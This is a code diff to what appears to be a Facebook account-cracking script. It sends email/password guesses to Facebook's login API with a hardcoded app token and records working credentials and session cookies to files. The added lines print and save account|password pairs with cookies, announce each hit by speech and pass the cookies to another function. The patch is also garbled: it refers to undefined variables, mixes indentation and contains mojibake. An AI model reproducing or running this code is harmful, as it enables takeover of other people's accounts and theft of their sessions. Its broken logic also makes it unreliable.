@@ -148,9 +148,23 @@ def method():
               data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
               response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
               if 6==random.randint(1,300):
-                 oku.append(acc)
-                 print('\033[1;32m[ABDULLAH-OK❤️‍🩹] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
-                 open('/sdcard/abdullah-Ok.txt','a').write(f'{acc}|{pswd}\n')
+                 #SHANTO-King
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
+				os.system('espeak -a 300 " C,  P"')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				#SHANTO-King
+				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
+				print('\033[0;94m===============================================')
+				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
+				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
+				cek_apk(session,coki)
                  break
               else:
                    continue   
